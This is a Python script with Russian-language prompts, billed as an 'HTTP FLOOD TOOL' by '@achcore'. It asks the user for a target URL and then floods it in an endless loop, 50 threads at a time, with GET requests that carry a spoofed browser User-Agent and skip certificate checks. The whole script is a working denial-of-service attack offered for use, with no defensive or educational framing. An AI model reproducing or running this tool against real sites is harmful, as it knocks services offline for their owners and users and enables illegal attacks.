import os
import sys
import threading
from collections import deque
import requests

message_queue = deque(maxlen=40)

def install_package(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        return True
    except:
        return False

def check_packages():
    try:
        __import__('requests')
        print("requests ━ Установлен!")
    except ImportError:
        print("\nТребуется библиотека requests")
        if input("Установить? (y/n): ").lower() == 'y':
            if install_package('requests'):
                print("requests успешно установлен!")
            else:
                print("Не удалось установить requests!")
                sys.exit(1)
        else:
            sys.exit(1)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()

def print_banner():
    print("""
    ╔══════════════════════════════════════════╗
    ║             HTTP FLOOD TOOL              ║
    ╚══════════════════════════════════════════╝
    Coder - @achcore
    """)

def send_request(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59'
    }
    
    try:
        response = requests.get(url, headers=headers, verify=False)
        message = f"[{response.status_code}] {url}"
    except Exception as e:
        message = f"[ERROR] {str(e)}"
    
    print(message)
    message_queue.append(message)

def main():
    check_packages()
    
    clear_screen()
    target_url = input("Введите URL цели (с http/https): ").strip()
    
    if not target_url.startswith(('http://', 'https://')):
        print("\nURL должен начинаться с http:// или https://")
        target_url = input("Введите URL правильно: ").strip()

    print("\nЗапуск атаки... Ctrl+C для остановки\n")
    
    try:
        while True:
            threads = []
            for _ in range(50):  # Количество одновременных запросов
                t = threading.Thread(target=send_request, args=(target_url,))
                t.daemon = True
                t.start()
                threads.append(t)
            
            for t in threads:
                t.join()
                
    except KeyboardInterrupt:
        print("\nАтака остановлена")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    main()